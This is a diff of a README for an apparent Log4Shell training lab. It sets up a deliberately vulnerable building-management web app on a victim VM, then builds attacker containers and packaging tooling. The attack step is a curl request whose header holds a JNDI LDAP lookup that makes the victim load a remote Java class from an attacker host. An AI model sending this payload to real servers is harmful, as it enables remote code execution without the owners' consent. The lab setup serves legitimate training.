@@ -35,39 +35,45 @@ M75-LOG4J-VULNERABILITY
 ## Victim
 
 1. Download and install the vulnerable web app.
-```bash
-sudo apt-get update
-wget -O /tmp/buildingmgmt.deb https://github.com/sintax1/M75-log4j-vuln/blob/master/victim/buildingmgmt.1.0-2.deb?raw=true
-sudo apt install -y /tmp/buildingmgmt.deb
-```
+    ```bash
+    sudo apt-get update
+    wget -O /tmp/buildingmgmt.deb https://github.com/sintax1/M75-log4j-vuln/blob/master/victim/buildingmgmt_1.0-2_all.deb?raw=true
+    sudo apt install -y /tmp/buildingmgmt.deb
+    ```
 
 ## Attacker
 
 1. clone the source repo onto the attacker VM.
 
-```
-git clone https://github.com/sintax1/M75-log4j-vuln.git
-```
+    ```
+    git clone https://github.com/sintax1/M75-log4j-vuln.git
+    ```
 
 2. Build and run the docker containers.
 
-```
-cd M75-log4j-vuln/victim
-docker-compose up --build
-```
+    > Note: This requires [docker](#installing-docker-and-docker-compose) on the attacker VM
+
+    ```
+    sudo apt update && sudo apt install docker
+    cd M75-log4j-vuln/attacker
+    docker compose up --build
+    ```
 
 3. Launch the exploit.
 
-```
-VICTIM=<The victim accessible IP or domain name accessible by the attacker>
-VICTIM_VULN_PORT=<The port where the log4j vulnerable web app is running on the victim>
-ATTACKER=<The attacker IP or Domain name accessible by the victim, for callbacks>
-LDAP_PORT=1389
-STAGE2_JAVA_CLASS_NAME=Plugin
-curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:${LDAP_PORT}/${STAGE2_JAVA_CLASS_NAME}}'
-```
+    ```
+    VICTIM=<The victim accessible IP or domain name accessible by the attacker>
+    VICTIM_VULN_PORT=<The port where the log4j vulnerable web app is running on the victim>
+    ATTACKER=<The attacker IP or Domain name accessible by the victim, for callbacks>
+    LDAP_PORT=1389
+    STAGE2_JAVA_CLASS_NAME=Plugin
+    curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:${LDAP_PORT}/${STAGE2_JAVA_CLASS_NAME}}'
+    ```
 
 # Development
+
+## Attacker
+
 
 ## Victim
 
@@ -75,45 +81,46 @@ curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:
 
 > Note: Requires gradle java builder
 
-```bash
-cd victim/log4shell-vulnerable-app; gradle bootJar --no-daemon
-cp build/libs/*.jar ../buildingmgmt.1.0-2/building-management.jar
-```
+    ```bash
+    cd victim/log4shell-vulnerable-app; gradle bootJar --no-daemon
+    cp build/libs/*.jar ../buildingmgmt.1.0-2/building-management.jar
+    ```
 
 ### Build .deb package
 
-```bash
-# Use docker to build so you don't need to install debian build tools locally
-git clone https://github.com/tsaarni/docker-deb-builder.git
+    ```bash
+    # Use docker to build so you don't need to install debian build tools locally
+    git clone https://github.com/tsaarni/docker-deb-builder.git
 
-# Build the build cotnainer
-cd docker-deb-builder
-docker build -t docker-deb-builder:20.04 -f Dockerfile-ubuntu-20.04 .
+    # Build the build cotnainer
+    cd docker-deb-builder
+    docker build -t docker-deb-builder:20.04 -f Dockerfile-ubuntu-20.04 .
 
-# create the output dir for the .deb pkg
-mkdir output
+    # create the output dir for the .deb pkg
+    mkdir output
 
-# Build
-./build -i docker-deb-builder:20.04 -o output <path to debian source>
-
-
-cd victim
-make build
-
--- output --
-cd log4shell-vulnerable-app; gradle bootJar --no-daemon
-To honour the JVM settings for this build a single-use Daemon process will be forked. See https://docs.gradle.org/7.4.1/userguide/gradle_daemon.html#sec:disabling_the_daemon.
-Daemon will be stopped at the end of the build 
-
-BUILD SUCCESSFUL in 4s
-4 actionable tasks: 4 up-to-date
-cp log4shell-vulnerable-app/build/libs/*.jar buildingmgmt.1.0-2/opt/buildingmgmt/building-management.jar
-dpkg-deb --build buildingmgmt.1.0-2
-dpkg-deb: building package 'buildingmgmt' in 'buildingmgmt.1.0-2.deb'.
-```
+    # Build
+    ./build -i docker-deb-builder:20.04 -o output <path to debian source>
+    ```
 
 ### Transfer to the victim and install
 
+    ```bash
+    apt install buildingmgmt.*.deb
+    ```
+
+# Installing docker and docker compose
 ```bash
-apt install buildingmgmt.*.deb
+sudo apt update
+sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
+apt-cache policy docker-ce
+sudo apt install -y docker-ce
+
+mkdir -p ~/.docker/cli-plugins/
+curl -SL https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose
+chmod +x ~/.docker/cli-plugins/docker-compose
+sudo chown $USER /var/run/docker.sock
+
 ```
